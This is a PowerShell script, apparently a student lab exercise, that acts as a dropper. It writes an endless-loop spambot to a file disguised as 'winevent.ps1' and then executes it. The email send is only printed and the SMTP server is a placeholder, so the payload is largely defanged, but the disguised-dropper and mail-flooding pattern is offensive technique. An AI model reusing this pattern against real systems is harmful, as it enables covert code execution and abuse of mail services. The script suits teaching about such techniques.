<# 
    Storyline: Dropper for spambot that will save to a directory 
    And then execute it.
#>


$writeSbBot = @'

# Send an email using Powershell

# Create an array of emails 
$toSend = @('noah.stiles@mymail.champlain.edu', 'stiles@mymail.champlain.edu', 'noah@mymail.champlain.edu')

# Message Body
$msg = "He had unknowingly taken up sleepwalking as a nighttime hobby. He had reached the point where he was paranoid about being paranoid."

# The while loop will spam the target, sends it over and over again
while ($true) {
    foreach ($email in $toSend) {

        # Send the Email:
        write-host "Send-MailMessage -from 'noah.stiles@mymail.champlain.edu' -To $email -Subject 'Tisk Tisk'`
        -Body $msg -SmtpServer x.x.x.x"
        

        # Pause for 1 second (safeguard)
        Start-Sleep 1
    }
}

'@

# Directory to write the bot
$sbDir = 'C:\Users\noahs\OneDrive\Desktop\Sys_Automation\SYS320-Automation-and-Scripting\Week10\class\'

# Create a random number to add to the file.
$sbRand = Get-Random -Minimum 1000 -Maximum 1999

# Create the file and location to save the bot
# C:\Users\noahs\OneDrive\Desktop\Sys_Automation\SYS320-Automation-and-Scripting\Week10\class\1099winevent.ps1
$file = $sbDir + $sbRand + "winevent.ps1"

# Write to a file
$writeSbBot | Out-File -FilePath $file

# Execute the Powershell Script
Invoke-Expression $file
